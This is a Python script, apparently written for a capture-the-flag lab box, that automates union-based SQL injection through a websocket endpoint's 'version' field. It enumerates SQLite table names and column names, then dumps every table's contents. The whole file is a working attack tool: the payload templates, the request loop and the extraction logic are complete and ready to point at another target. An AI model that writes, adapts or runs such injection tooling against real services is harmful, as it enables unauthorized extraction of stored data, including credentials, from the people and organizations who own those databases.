import json, signal, sys
from websocket import create_connection
from pwn import *

payloadTemplates = {"TableNames":"select group_concat(name,';||;'),2,3,4 from sqlite_schema where type in ('table','view') and name not like 'sqlite_%'",
"ColumnNames":"select group_concat(name,';||;'),2,3,4 from pragma_table_info('{tableName}')",
"Values":"select group_concat({columnsName},';||;'),2,3,4 from {tableName}"
}

ws_server = "ws://10.129.200.247:5789/version"

def makeRequest(dataJSON):
	wsRequest = create_connection(ws_server)
	wsRequest.send(dataJSON)
	response = wsRequest.recv()
	wsRequest.close()
	return response

def formatOne(s: str, field: str, value: str):
	idx_begin = s.find('{'+field+'}')
	idx_end = idx_begin + len(field) + 2
	return s[:idx_begin] + value + s[idx_end:]

def findValues(payloadTemplate):
	payload = '''" union %s -- -''' % payloadTemplate

	data = {
		"version": payload,
	}
	resp = makeRequest(json.dumps(data))
	respFormated = json.loads(resp)["message"]["id"].split(";||;")

	for i in range(0, len(respFormated)):
		foundValue = respFormated[i].encode("unicode_escape").decode("utf-8")
		log.info(f"  •{foundValue}")

	return respFormated

def def_handler(sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

#Ctrl + c
signal.signal(signal.SIGINT, def_handler)

bar = log.progress("SQLI Union based")
bar.status("Starting")

print("-----------------------------------------------------------------------------------")
log.info("Table names:")
tables = findValues(payloadTemplates["TableNames"])
print("-----------------------------------------------------------------------------------")

for table in tables:
	log.info(f"Column names from table {table}:")
	columns = findValues(formatOne(payloadTemplates["ColumnNames"],"tableName",table))
	columnsToConcat = (" || ',' || ".join(columns))
	print("\n")
	log.info("Columns: "+columnsToConcat.replace("|| ',' ||","|"))
	payloadWithTable = formatOne(payloadTemplates["Values"],"tableName",table)
	values = findValues(formatOne(payloadWithTable,"columnsName",columnsToConcat))
	print("-----------------------------------------------------------------------------------")
